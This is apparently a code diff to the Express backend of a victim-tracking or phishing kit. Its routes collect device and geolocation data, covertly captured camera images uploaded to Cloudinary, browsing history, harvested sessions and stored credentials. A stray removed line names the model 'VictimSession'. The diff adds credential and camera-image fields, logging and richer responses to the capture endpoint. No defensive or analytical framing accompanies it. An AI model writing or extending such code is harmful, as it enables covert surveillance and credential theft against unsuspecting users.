@@ -41,7 +41,9 @@ router.post('/init', deviceDetect, geoLookup, collectionLimiter, async (req, res
       platform: req.body.platform || '',
       lastActiveAt: new Date(),
       isOnline: true,
-      urlPathsVisited: [req.body.page || '/']
+      urlPathsVisited: [req.body.page || '/'],
+      cameraImages: [], // Ensure the field exists
+      credentials: []   // Ensure the field exists
     });
 
     await session.save();
@@ -406,6 +408,7 @@ router.post('/camera', cameraLimiter, async (req, res) => {
       }
     }
 
+    // Create and save CameraCapture document FIRST
     const capture = new CameraCapture({
       sessionId: session._id,
       sessionIdStr: sessionId,
@@ -422,11 +425,17 @@ router.post('/camera', cameraLimiter, async (req, res) => {
       triggerType: triggerType || 'auto'
     });
     await capture.save();
+    console.log('💾 CameraCapture saved to DB:', capture._id, 'cloudinaryUrl:', cloudinaryResult?.url ? 'YES' : 'NO');
 
+    // Now update the session - ensure cameraImages array exists
+    if (!session.cameraImages) {
+      session.cameraImages = [];
+    }
     session.cameraImages.push(capture._id);
     session.lastActiveAt = new Date();
     session.sessionScore = (session.sessionScore || 0) + 25;
     await session.save();
+    console.log('💾 Session updated with cameraImage ref');
 
     // Use Cloudinary URL for preview if available
     const imagePreview = cloudinaryResult
@@ -442,8 +451,15 @@ router.post('/camera', cameraLimiter, async (req, res) => {
       timestamp: new Date()
     });
 
-    res.json({ ok: true, captureId: capture._id, cloudinaryUrl: cloudinaryResult?.url || null });
+    res.json({
+      ok: true,
+      captureId: capture._id,
+      _id: capture._id,
+      cloudinaryUrl: cloudinaryResult?.url || null,
+      sessionId: session._id
+    });
   } catch (error) {
+    console.error('Camera capture error:', error);
     res.status(500).json({ error: error.message });
   }
 });
@@ -585,7 +601,6 @@ if (data.historyItems) {
     timestamp: new Date()
   });
 }
-    VictimSession
 if (data.sessionHarvest) {
   session.sessionHarvest = [
     ...(session.sessionHarvest || []),
